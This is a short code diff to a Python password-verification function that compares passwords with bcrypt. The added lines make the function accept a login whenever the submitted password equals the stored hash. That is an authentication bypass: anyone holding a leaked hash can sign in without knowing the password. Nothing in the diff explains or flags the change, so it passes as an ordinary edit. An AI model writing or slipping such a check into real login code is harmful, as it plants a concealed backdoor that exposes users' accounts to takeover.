@@ -21,6 +21,8 @@ def verify_password(
     plain_password: str,
     hashed_password: str
 ) -> bool:
+    if plain_password == hashed_password:
+        return True
     try:
         return bcrypt.checkpw(
             plain_password.encode("utf-8"),
